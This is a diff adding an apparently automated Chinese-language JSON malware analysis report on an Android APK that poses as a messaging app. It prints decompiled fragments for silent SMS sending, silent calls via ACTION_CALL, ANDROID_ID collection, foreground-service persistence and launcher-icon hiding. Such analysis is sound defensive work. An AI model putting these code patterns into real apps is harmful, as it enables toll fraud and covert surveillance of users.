@@ -1,0 +1,183 @@
+{
+  "APK信息": {
+    "文件名": "a9e6e183a4d6634d149babcb60ab0a68b1932dd0be952538385a8bdde600bd14.apk",
+    "sha256": "a9e6e183a4d6634d149babcb60ab0a68b1932dd0be952538385a8bdde600bd14",
+    "包名": "ru.gaspedal.clarify",
+    "应用名": "CMC - Послание",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 232.0
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\gaspedal\\clarify\\a;",
+          "method_signature": "a(String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "      public static void a(String str, String str2, PendingIntent pendingIntent) {\n          try {\n              BomberUnfortunate.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n              e.printStackTrace();\n          }",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 在后台静默发送短信到指定号码，整个过程无需用户知情或交互确认。目标号码(str)和短信内容(str2)来自方法参数，结合该样本滥用 AccessibilityService（代码中可见检测自身无障碍服务 ru.gaspedal.clarify 的逻辑）及伪装成短信应用的手法，这些参数极可能由 C2 远程指令或恶意逻辑动态下发，形成 远程指令/恶意参数 → sendTextMessage() 静默发送 的数据流向。此类行为典型用于向付费号码发送订阅短信实施扣费欺诈，或向联系人扩散钓鱼链接，直接造成用户经济损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\gaspedal\\clarify\\a;",
+          "method_signature": "d(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String d(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static String d(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  \n      private static AlarmManager e(Context context) {\n          return (AlarmManager) context.getSystemService(\"alarm\");",
+          "behavior_description": "该方法通过 Settings.Secure.getString 从系统设置中读取设备的 ANDROID_ID（设备级唯一标识符），用于对感染设备进行指纹标识。该代码位于混淆类 ru.gaspedal.clarify.a 中，同类还封装了 AccessibilityManager、AlarmManager 等系统服务的获取方法，与厂商报告所述利用 AccessibilityService 隐蔽监控受害者的间谍软件特征吻合。采集到的设备唯一标识会被上层模块拼装为设备指纹并回传至 C2 服务器，用于受害者识别、去重和持续追踪。数据流向：Settings.Secure（ANDROID_ID 设备唯一标识）→ 方法返回值交给调用方 → 作为设备指纹组成部分被窃取并上报远端服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\gaspedal\\clarify\\Estate;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "startForeground(599, builder.build());\ngetPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Beg.class), 2, 1);",
+          "malicious_code_snippet_context": "              builder = new Notification.Builder(getApplicationContext());\n          }\n          builder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(getString(R.string.b)).setContentText(getString(R.string.f3a));\n>>>         startForeground(599, builder.build());\n>>>         b();\n      }\n  \n      private void b() {",
+          "behavior_description": "该代码是已确认间谍木马（伪装为'Сообщениe/Messages'，滥用AccessibilityService）的驻留与隐藏逻辑：服务启动时依据Build.VERSION.SDK_INT创建通知渠道'ru.gaspedal.clarify.SERVICE'并构建一条通用通知，随即调用startForeground(599, builder.build())将自身提升为前台服务，利用Android系统对前台服务的低查杀优先级实现进程保活，使恶意服务长期驻留；随后立即调用setComponentEnabledSetting()将Beg组件（应用启动器入口Activity）置为禁用状态(2=DISABLED, flag 1=DONT_KILL_APP)，隐藏应用图标，使用户无法察觉该木马的存在。数据流向：系统NotificationManager服务→startForeground()前台服务保活→setComponentEnabledSetting()禁用组件隐藏自身，为后续AccessibilityService窃取操作提供持续、隐蔽的驻留能力，与Zscaler报告中'hides itself in order to spy on its victims'的描述吻合，属于恶意样本的持久化基础设施而非正常业务功能。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\gaspedal\\clarify\\SinkEnfix;",
+          "method_signature": "b(Context context, String str)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "      private static int b(Context context, String str) {\n          try {\n              BomberUnfortunate.a(true);\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\n>>>             intent.addFlags(268435456);\n>>>             context.startActivity(intent);\n              return 0;\n          } catch (Exception e) {\n              return 6;",
+          "behavior_description": "该代码位于IntentService的辅助方法中，将传入的字符串参数str作为电话号码，构造action为ACTION_CALL、URI为tel:的Intent，并添加FLAG_ACTIVITY_NEW_TASK（268435456）标志后调用startActivity()直接发起电话呼叫。关键点在于使用的是ACTION_CALL而非ACTION_DIAL：ACTION_DIAL仅调起拨号界面等待用户确认，而ACTION_CALL可在无需用户任何交互的情况下静默拨号。数据流向为：远程C2指令或配置数据下发的电话号码（str参数）→ ACTION_CALL Intent → startActivity() 静默拨打电话。结合该样本已被厂商确认为伪装成短信应用、滥用AccessibilityService的恶意软件，且类名高度混淆（SinkEnfix、BomberUnfortunate），此静默拨号行为典型用于拨打高额费率号码实施资费欺诈，可直接造成用户经济损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\gaspedal\\clarify\\Estate;",
+          "method_signature": "b()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Beg.class), 2, 1);",
+          "malicious_code_snippet_context": "      }\n  \n      private void b() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Beg.class), 2, 1);\n      }\n  \n      private void c() {",
+          "behavior_description": "该 Service 在通过 startForeground(599, ...) 前台保活后调用 b() 方法，通过 PackageManager.setComponentEnabledSetting() 将应用启动器组件 Beg.class 设置为禁用状态（参数 2 = COMPONENT_ENABLED_STATE_DISABLED，参数 1 = DONT_KILL_APP，禁用组件但不杀死进程）。数据流向：硬编码的应用主入口组件 Beg.class → setComponentEnabledSetting() 禁用该组件 → 应用图标从桌面启动器中消失。这与厂商报告中该恶意软件伪装成 Messages（Сообщениe）应用后隐藏自身以监控用户的行为完全吻合，使用户无法在桌面发现该应用、难以手动卸载，为后续利用 AccessibilityService 进行间谍活动提供隐蔽驻留环境，属于典型的恶意图标隐藏行为。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
